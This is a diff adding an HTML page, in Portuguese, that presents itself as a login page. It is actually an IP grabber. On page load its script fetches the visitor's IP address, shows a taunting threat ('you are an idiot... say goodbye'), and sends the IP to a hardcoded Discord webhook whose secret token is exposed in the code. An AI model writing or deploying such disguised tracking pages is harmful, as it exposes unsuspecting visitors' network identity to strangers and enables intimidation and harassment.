@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VOCÊ É UM IDIOTA!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 50px;
+    }
+
+    #ip-address {
+      font-size: 24px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Login</h1>
+  <p id="ip-address">Carregando...</p>
+
+  <script>
+    // Função para obter o endereço IP do usuário
+    async function getIPAddress() {
+      try {
+        const response = await fetch('https://api64.ipify.org?format=json');
+        const data = await response.json();
+        const ipAddress = data.ip;
+        const message = `VOCÊ É UM IDIOTA! SEU IP É ${ipAddress}, DIGA ADEUS!`;
+
+        document.getElementById('ip-address').innerText = message;
+
+        // Enviando para um webhook do Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1213254972897239080/DphlKA2Qw9k93UFHkwhP1gOnYbxjWbG7Mw0QFd5ddiM6BSfOrhyQVSC9ugdJMamlmcbL';
+
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: message,
+          }),
+        });
+      } catch (error) {
+        console.error('Erro ao iniciar o login', error);
+        document.getElementById('ip-address').innerText = 'Erro ao iniciar o login';
+      }
+    }
+
+    window.onload = getIPAddress;
+  </script>
+</body>
+</html>
